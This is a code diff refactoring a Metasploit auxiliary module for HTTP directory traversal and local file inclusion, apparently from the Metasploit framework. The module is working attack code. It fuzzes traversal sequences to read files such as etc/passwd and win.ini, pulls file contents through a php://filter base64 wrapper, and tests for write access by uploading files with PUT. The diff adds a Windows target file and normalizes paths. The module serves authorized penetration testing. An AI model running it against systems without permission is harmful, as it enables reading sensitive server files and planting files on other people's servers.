@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -59,7 +59,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('PATH',    [true, 'Vulnerable path. Ex: /foo/index.php?pg=', '/']),
         OptString.new('DATA',    [false,'HTTP body data', '']),
         OptInt.new('DEPTH',      [true, 'Traversal depth', 5]),
-        OptRegexp.new('PATTERN', [true, 'Regexp pattern to determine directory traversal', '^HTTP/1.1 200 OK']),
+        OptRegexp.new('PATTERN', [true, 'Regexp pattern to determine directory traversal', '^HTTP/\\d\\.\\d 200']),
         OptPath.new(
           'FILELIST',
           [
@@ -80,6 +80,18 @@ class Metasploit3 < Msf::Auxiliary
     deregister_options('RHOST')
   end
 
+
+  # Avoids writing to datastore['METHOD'] directly
+  def method
+    @method || datastore['METHOD']
+  end
+
+  # Avoids writing to datastore['DATA'] directly
+  def data
+    @data || datastore['DATA']
+  end
+
+
   #
   # The fuzz() function serves as the engine for the module.  It can intelligently mutate
   # a trigger, and find potential bugs with it.
@@ -94,19 +106,19 @@ class Metasploit3 < Msf::Auxiliary
 
     # Initialize the default file(s) we should try to read during fuzzing
     if datastore['FILE'].empty?
-      file_to_read = ['etc/passwd', 'boot.ini']
+      file_to_read = ['etc/passwd', 'boot.ini', 'windows\\win.ini']
     else
       file_to_read = [datastore['FILE']]
     end
 
     # Each possible trigger, we try to traverse multiple levels down depending
     # on datastore['DEPATH']
-    depth  = datastore['DEPTH']
+    depth = datastore['DEPTH']
     triggers.each do |base|
       1.upto(depth) do |d|
         file_to_read.each do |f|
           trigger = base * d
-          p = datastore['PATH'] + trigger + f
+          p = normalize_uri(datastore['PATH']) + trigger + f
           req = ini_request(p)
           vprint_status("Trying: http://#{rhost}:#{rport}#{p}")
           res = send_request_cgi(req, 25)
@@ -124,10 +136,6 @@ class Metasploit3 < Msf::Auxiliary
   def ini_request(uri)
     req = {}
 
-    # If the user is using some rare-to-use method, we probably have not fully tested,
-    # so we will not support it for now.
-    method = datastore['METHOD']
-    data   = datastore['DATA']
     case method
     when 'GET'
       # Example: Say we have the following datastore['PATH']
@@ -135,8 +143,8 @@ class Metasploit3 < Msf::Auxiliary
       # We expect it to regex the GET parameters:
       # 'page=1&id=3&note=whatever'
       # And then let queryparse() to handle the rest
-      data = uri.match(/\?(\w+=.+&*)$/)
-      req['vars_get'] = queryparse(data[1]) if not data.nil?
+      query_params = uri.match(/\?(\w+=.+&*)$/)
+      req['vars_get'] = queryparse(query_params[1]) if query_params
     when 'POST'
       req['vars_post'] = queryparse(data) if not data.empty?
     when 'PUT'
@@ -154,10 +162,10 @@ class Metasploit3 < Msf::Auxiliary
       this_path = uri
     end
 
-    req['method']     = datastore['METHOD']
+    req['method']     = method
     req['uri']        = this_path
     req['headers']    = {'Cookie'=>datastore['COOKIE']} if not datastore['COOKIE'].empty?
-    req['data']       = datastore['DATA'] if not datastore['DATA'].empty?
+    req['data']       = data if not data.empty?
     req['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
 
     return req
@@ -187,7 +195,7 @@ class Metasploit3 < Msf::Auxiliary
     if datastore['TRIGGER'].empty?
       # Found trigger using fuzz()
       found = true if trigger
-      uri = datastore['PATH'] + trigger
+      uri = normalize_uri(datastore['PATH']) + trigger
     else
       # Manual check. meh.
       if datastore['FILE'].empty?
@@ -195,7 +203,7 @@ class Metasploit3 < Msf::Auxiliary
         return
       end
 
-      uri = datastore['PATH'] + trigger + datastore['FILE']
+      uri = normalize_uri(datastore['PATH']) + trigger + datastore['FILE']
       req = ini_request(uri)
       vprint_status("Trying: http://#{rhost}:#{rport}#{uri}")
       res = send_request_cgi(req, 25)
@@ -211,13 +219,13 @@ class Metasploit3 < Msf::Auxiliary
         :port     => rport,
         :vhost    => datastore['VHOST'],
         :path     => uri,
-        :params   => datastore['PATH'],
+        :params   => normalize_uri(datastore['PATH']),
         :pname    => trigger,
         :risk     => 3,
         :proof    => trigger,
         :name     => self.fullname,
         :category => "web",
-        :method   => datastore['METHOD']
+        :method   => method
       })
 
     else
@@ -234,7 +242,7 @@ class Metasploit3 < Msf::Auxiliary
       # Our trigger already puts us in '/', so our filename doesn't need to begin with that
       f = f[1,f.length] if f =~ /^\//
 
-      req = ini_request(uri = (datastore['PATH'] + trigger + f).chop)
+      req = ini_request(uri = (normalize_uri(datastore['PATH']) + trigger + f).chop)
       res = send_request_cgi(req, 25)
 
       vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res
@@ -261,7 +269,7 @@ class Metasploit3 < Msf::Auxiliary
       # Our trigger already puts us in '/', so our filename doesn't need to begin with that
       f = f[1,f.length] if f =~ /^\//
 
-      req = ini_request(uri = (datastore['PATH'] + "php://filter/read=convert.base64-encode/resource=" + f).chop)
+      req = ini_request(uri = (normalize_uri(datastore['PATH']) + "php://filter/read=convert.base64-encode/resource=" + f).chop)
       res = send_request_cgi(req, 25)
 
       vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res
@@ -281,20 +289,20 @@ class Metasploit3 < Msf::Auxiliary
   #
   def is_writable(trigger)
     # Modify some registered options for the PUT method
-    tmp_method = datastore['METHOD']
-    tmp_data   = datastore['DATA']
-    datastore['METHOD'] = 'PUT'
+    tmp_method = method
+    tmp_data   = data
+    @method = 'PUT'
 
-    if datastore['DATA'].empty?
+    if data.empty?
       unique_str = Rex::Text.rand_text_alpha(4) * 4
-      datastore['DATA']   = unique_str
+      @data = unique_str
     else
-      unique_str = datastore['DATA']
+      unique_str = data
     end
 
     # Form the PUT request
     fname = Rex::Text.rand_text_alpha(rand(5) + 5) + '.txt'
-    uri = datastore['PATH'] + trigger + fname
+    uri = normalize_uri(datastore['PATH']) + trigger + fname
     vprint_status("Attempt to upload to: http://#{rhost}:#{rport}#{uri}")
     req = ini_request(uri)
 
@@ -302,8 +310,8 @@ class Metasploit3 < Msf::Auxiliary
     send_request_cgi(req, 25)
 
     # Prepare request to read our file
-    datastore['METHOD'] = 'GET'
-    datastore['DATA']   = tmp_data
+    @method = 'GET'
+    @data   = tmp_data
     req = ini_request(uri)
     vprint_status("Verifying upload...")
     res = send_request_cgi(req, 25)
@@ -316,7 +324,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Ah, don't forget to restore our method
-    datastore['METHOD'] = tmp_method
+    @method = tmp_method
   end
 
   #
@@ -324,21 +332,14 @@ class Metasploit3 < Msf::Auxiliary
   # This is used in the lfi_download() function
   #
   def load_filelist
-    f = File.open(datastore['FILELIST'], 'rb')
-    buf = f.read
-    f.close
-    return buf
+    File.open(datastore['FILELIST'], 'rb') {|f| f.read}
   end
 
   def run_host(ip)
-    # Make sure datastore['PATH] begins with a '/'
-    if datastore['PATH'] !~ /^\//
-      datastore['PATH'] = '/' + datastore['PATH']
+    # Warn if it's not a well-formed UPPERCASE method
+    if method !~ /^[A-Z]+$/
+      print_warning("HTTP method #{method} is not Apache-compliant. Try only UPPERCASE letters.")
     end
-
-    # Some webservers (ie. Apache) might not like the HTTP method to be lower-case
-    datastore['METHOD'] = datastore['METHOD'].upcase
-
     print_status("Running action: #{action.name}...")
 
     # And it's..... "SHOW TIME!!"
